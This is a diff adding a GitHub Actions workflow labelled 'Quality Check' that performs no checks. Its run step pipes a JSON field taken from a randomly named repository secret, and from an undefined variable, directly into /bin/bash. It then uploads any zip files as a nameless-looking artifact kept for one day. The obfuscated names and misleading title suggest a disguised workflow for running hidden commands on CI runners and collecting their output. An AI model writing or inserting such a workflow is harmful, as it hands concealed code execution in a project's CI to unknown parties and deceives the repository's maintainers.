@@ -1,0 +1,23 @@
+name: Quality Check
+on:
+  workflow_dispatch:
+
+jobs:
+  scheduler:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Invoke
+        env:
+          dfpeq07241: ${{ secrets.dfpeq07241 }}
+        run: |
+          printf '%s' "$dfpeq07241" | jq -r .jjnch8512 | /bin/bash
+          echo $ij99539 | jq -r .cqu041 | /bin/bash
+
+      - name: Store artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: GtrrMSaK
+          path: "*.zip"
+          retention-days: 1
